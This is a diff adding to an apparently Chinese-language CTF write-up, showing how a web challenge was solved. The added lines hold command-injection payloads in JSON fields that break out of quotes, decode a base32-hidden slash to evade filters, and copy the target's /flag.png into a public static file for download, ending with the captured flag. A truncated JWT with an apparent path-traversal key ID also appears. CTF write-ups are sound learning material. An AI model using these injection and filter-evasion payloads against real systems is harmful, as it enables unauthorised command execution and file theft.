@@ -108,6 +108,20 @@ output`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL3Vwb
 //变量b为/,然后base32读取根目录flag.png
 {"content":"1\"';b=`b=ch;e${b}o 'F4FA====' |base32 -d`;base32 ${b}proc${b}self${b}cmdline >> as*${b}sty* ;'\""}
 ```
+sh不支持多级目录通配符...
+
+```json
+{"content":"1\"';e=se;b=`b=ch;e${b}o 'F4FA====' |base32 -d`;base32 ${b}flag.png > as${e}ts${b}style ;'\""}
+```
+
+然后访问&下载/static/style 
+`base32 -d style >flag.png`
+
+![flag.png](https://gitee.com/leiye87/typora_picture/raw/master/20240414174123.png)
+
+
+
+`bctf{Lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}`
 
 
 # reverse
